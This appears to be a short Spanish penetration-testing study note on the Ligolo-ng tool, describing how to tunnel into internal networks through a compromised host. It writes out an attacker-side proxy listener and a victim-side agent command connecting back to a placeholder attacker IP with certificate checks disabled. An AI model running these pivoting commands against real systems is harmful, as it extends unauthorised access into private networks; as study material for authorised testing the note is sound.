---
tags: [herramienta, pivoting]
tipo: herramienta
categoria: pivoting
ultima_revision: 2026-10-20
---

# Ligolo-ng

Túnel de red para alcanzar redes internas mediante un host comprometido como pivote.

## Uso típico

```bash
# Atacante
./proxy -selfcert -laddr 0.0.0.0:11601
# Victima
./agent -connect <IP_atacante>:11601 -ignore-cert
# En la sesion: session -> start; anadir ruta a la red interna
```

## Notas / lecciones

- Sin `-ignore-cert` (o sin aceptar el certificado) el agent no conecta.
- Hay que **añadir la ruta** a la red interna; si no, es inalcanzable.

## Técnicas relacionadas

- [[Pivoting-Ligolo]], [[WireGuard]]
